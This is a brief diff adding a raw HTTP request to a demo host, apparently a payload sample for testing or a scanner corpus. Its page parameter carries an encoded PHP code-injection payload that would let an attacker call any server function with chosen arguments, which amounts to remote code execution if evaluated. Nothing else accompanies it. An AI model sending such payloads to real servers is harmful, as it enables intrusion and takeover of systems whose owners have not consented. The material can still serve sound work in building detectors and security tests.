@@ -1,0 +1,4 @@
+GET /a?page=$_GET[%26%2339;func%26%2339;]($_GET[%26%2339;arg%26%2339;]); HTTP/1.1
+Host: demo.example.com
+Connection: close
+
